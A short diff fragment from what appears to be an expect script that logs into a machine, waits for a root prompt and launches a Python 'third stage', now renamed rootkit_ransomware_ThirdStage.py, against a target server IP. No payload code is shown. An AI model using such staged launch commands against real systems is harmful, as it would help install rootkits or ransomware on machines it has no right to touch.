@@ -19,7 +19,7 @@ send "$password\r"
 
 
 expect "*:~# "
-send "python3 $path/ThirdStage.py $path $ip $target_server_ip\r"
+send "python3 $path/rootkit_ransomware_ThirdStage.py $path $ip $target_server_ip\r"
 
 expect "*:~# "
 send "exit\r"
